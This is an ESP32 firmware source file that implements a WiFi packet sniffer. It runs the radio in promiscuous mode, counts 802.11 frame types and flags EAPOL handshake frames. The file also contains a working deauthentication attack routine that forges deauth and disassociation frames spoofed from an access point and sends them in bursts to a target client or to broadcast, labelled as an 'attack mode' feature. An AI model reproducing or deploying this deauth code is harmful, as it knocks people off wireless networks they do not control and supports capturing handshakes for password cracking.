#include "PacketSniffer.h"
#include "config.h"
#include <WiFi.h>
#include "esp_wifi.h"

PacketSniffer g_sniffer;

// --- Shared capture state (written from the WiFi RX task) -------------------
static portMUX_TYPE  s_mux = portMUX_INITIALIZER_UNLOCKED;
static PacketStats   s_stats;
static PacketRecord  s_ring[PACKET_LOG_DEPTH];
static volatile uint32_t s_ringHead = 0;   // total pushed (monotonic)
static volatile uint8_t  s_curChannel = 1;

// 802.11 frame-control helpers.
static inline uint8_t fcType(uint8_t fc0)    { return (fc0 >> 2) & 0x3; }
static inline uint8_t fcSubtype(uint8_t fc0) { return (fc0 >> 4) & 0xF; }

static void classify(const uint8_t* p, int len, int8_t rssi) {
    if (len < 4) return;
    uint8_t fc0 = p[0];
    uint8_t type = fcType(fc0);
    uint8_t sub  = fcSubtype(fc0);

    PacketRecord rec;
    rec.tMs     = millis();
    rec.rssi    = rssi;
    rec.channel = s_curChannel;
    rec.subtype = sub;

    // addr1 = dst (bytes 4-9), addr2 = src (bytes 10-15) for most frames.
    if (len >= 16) {
        memcpy(rec.dst, p + 4,  6);
        memcpy(rec.src, p + 10, 6);
    }

    const char* kind = "other";
    portENTER_CRITICAL(&s_mux);
    s_stats.total++;
    if (type == 0) {            // management
        s_stats.mgmt++;
        switch (sub) {
            case 8:  s_stats.beacon++; kind = "beacon"; break;
            case 4:  s_stats.probe++;  kind = "probe-req"; break;
            case 5:  s_stats.probe++;  kind = "probe-rsp"; break;
            case 12: s_stats.deauth++; kind = "deauth"; break;
            case 10: s_stats.deauth++; kind = "disassoc"; break;
            default: kind = "mgmt"; break;
        }
    } else if (type == 1) {     // control
        s_stats.ctrl++; kind = "ctrl";
    } else if (type == 2) {     // data
        s_stats.data++; kind = "data";
        // Best-effort EAPOL (0x888E) detection in the LLC/SNAP region.
        for (int i = 24; i + 1 < len && i < 40; i++) {
            if (p[i] == 0x88 && p[i + 1] == 0x8E) {
                s_stats.eapol++; kind = "eapol"; break;
            }
        }
    }
    strncpy(rec.kind, kind, sizeof(rec.kind) - 1);

    s_ring[s_ringHead % PACKET_LOG_DEPTH] = rec;
    s_ringHead++;
    portEXIT_CRITICAL(&s_mux);
}

// Promiscuous RX callback - keep it short.
static void IRAM_ATTR snifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type == WIFI_PKT_MISC) return;
    const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
    classify(pkt->payload, pkt->rx_ctrl.sig_len, pkt->rx_ctrl.rssi);
}

void PacketSniffer::begin() {
    _channel = AP_CHANNEL;
    s_curChannel = _channel;
}

void PacketSniffer::start(uint8_t channel) {
    if (_active) { setChannel(channel); return; }
    _channel = channel ? channel : AP_CHANNEL;
    s_curChannel = _channel;

    wifi_promiscuous_filter_t filter = {};
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
                         WIFI_PROMIS_FILTER_MASK_CTRL |
                         WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&snifferCb);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
    _active = true;
    Serial.printf("[SNIFF] promiscuous ON, channel %u\n", _channel);
}

void PacketSniffer::stop() {
    if (!_active) return;
    esp_wifi_set_promiscuous(false);
    _active = false;
    Serial.println("[SNIFF] promiscuous OFF");
}

void PacketSniffer::setChannel(uint8_t ch) {
    if (ch < 1 || ch > 14) return;
    _channel = ch;
    s_curChannel = ch;
    if (_active) esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

PacketStats PacketSniffer::stats() {
    PacketStats out;
    portENTER_CRITICAL(&s_mux);
    out = s_stats;
    portEXIT_CRITICAL(&s_mux);
    return out;
}

void PacketSniffer::resetStats() {
    portENTER_CRITICAL(&s_mux);
    s_stats = PacketStats();
    s_ringHead = 0;
    portEXIT_CRITICAL(&s_mux);
}

size_t PacketSniffer::recent(PacketRecord* out, size_t maxOut) {
    portENTER_CRITICAL(&s_mux);
    uint32_t head  = s_ringHead;
    size_t   avail = head < PACKET_LOG_DEPTH ? head : PACKET_LOG_DEPTH;
    if (avail > maxOut) avail = maxOut;
    // Copy oldest..newest of the last `avail` records.
    for (size_t i = 0; i < avail; i++) {
        uint32_t idx = (head - avail + i) % PACKET_LOG_DEPTH;
        out[i] = s_ring[idx];
    }
    portEXIT_CRITICAL(&s_mux);
    return avail;
}

// --- Deauthentication -------------------------------------------------------
uint32_t PacketSniffer::deauth(const uint8_t* apMac, const uint8_t* clientMac,
                               uint16_t bursts) {
    if (!_active) return 0;       // only from attack mode
    if (!apMac) return 0;

    static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    bool toBroadcast = true;
    uint8_t victim[6];
    if (clientMac) {
        memcpy(victim, clientMac, 6);
        for (int i = 0; i < 6; i++) if (victim[i]) { toBroadcast = false; break; }
    }
    const uint8_t* dst = toBroadcast ? bcast : victim;

    // Deauth management frame (reason 7: class-3 frame from nonassociated STA).
    uint8_t frame[26] = {
        0xC0, 0x00,                         // FC: mgmt / deauth
        0x00, 0x00,                         // duration
        0,0,0,0,0,0,                        // addr1 = destination
        0,0,0,0,0,0,                        // addr2 = source (BSSID)
        0,0,0,0,0,0,                        // addr3 = BSSID
        0x00, 0x00,                         // sequence
        0x07, 0x00                          // reason code 7
    };
    memcpy(frame + 4,  dst,   6);
    memcpy(frame + 10, apMac, 6);
    memcpy(frame + 16, apMac, 6);

    uint32_t sent = 0;
    for (uint16_t b = 0; b < bursts; b++) {
        // From AP -> victim.
        if (esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false) == ESP_OK)
            sent++;
        // Also disassociation (subtype 10) for good measure.
        frame[0] = 0xA0;
        if (esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false) == ESP_OK)
            sent++;
        frame[0] = 0xC0;
        delay(1);
    }
    Serial.printf("[DEAUTH] sent %u frames (ch %u)\n", sent, _channel);
    return sent;
}
